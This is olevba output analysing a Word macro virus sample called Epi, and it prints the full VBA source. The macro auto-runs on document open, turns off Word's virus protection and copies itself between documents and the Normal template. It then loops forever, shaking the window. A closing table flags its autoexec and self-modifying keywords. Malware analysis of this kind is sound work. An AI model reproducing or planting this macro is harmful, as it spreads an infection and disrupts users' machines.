olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Epi-dbe8cc0cf717b97ec215de61bf2df2c50ef9967f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Epi-dbe8cc0cf717b97ec215de61bf2df2c50ef9967f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()

On Error Resume Next

Options.VirusProtection = False

EpilepticFit

End Sub

Private Sub EpilepticFit()
    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
         Next I
        ' Save it
        If (Not ActiveDocument.ReadOnly) Then
            ActiveDocument.SaveAs AddToRecentFiles:=False
        End If
        
            
    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
            Next I
            ' Save It
            NormalTemplate.Save
    Else
        'If the normal and active are infected now activate the payload
        Convulse
    End If
  
End Sub

Private Sub Convulse()
  
    Dim maxWidth As Long
    Dim maxHeight As Long
    maxWidth = ActiveWindow.Width
    maxHeight = ActiveWindow.Height
    
    maxHeight = maxHeight - 50
    maxWidth = maxWidth - 50
    If (ActiveWindow.WindowState <> wdWindowStateNormal) Then
            ActiveWindow.WindowState = wdWindowStateNormal
    End If
    ActiveWindow.Height = ActiveWindow.Height / 2
    ActiveWindow.Height = ActiveWindow.Height / 2
    Randomize
    While (True)
        
        
        
        If Int(2 * Rnd) = 1 Then
            If (ActiveWindow.Height > maxHeight) Then
               ActiveWindow.Height = ActiveWindow.Height - 50
            Else
                ActiveWindow.Height = ActiveWindow.Height + 50
            End If
            
            If (ActiveWindow.Width > maxWidth) Then
                ActiveWindow.Width = ActiveWindow.Width - 50
            Else
                ActiveWindow.Width = ActiveWindow.Width + 50
            End If
            
            If (ActiveWindow.VerticalPercentScrolled > 90) Then
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled - 10
            Else
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled + 10
            End If
        Else
         
            If (ActiveWindow.Height < 50) Then
                ActiveWindow.Height = ActiveWindow.Height - 50
            Else
                ActiveWindow.Height = ActiveWindow.Height + 50
            End If
           
            If (ActiveWindow.Width < 50) Then
                ActiveWindow.Width = ActiveWindow.Width - 50
            Else
                ActiveWindow.Width = ActiveWindow.Width + 50
            End If
               
            If (ActiveWindow.VerticalPercentScrolled < 10) Then
                ActiveWindow.VerticalPercentScrolled = ActiveWindowVerticalPercentScrolled + 10
            Else
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled - 10
            End If
        End If
        Start = Timer   ' Set start time.
        Do While Timer < Start + 0.2
            DoEvents    ' Yield to other processes.
        Loop
    Wend
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

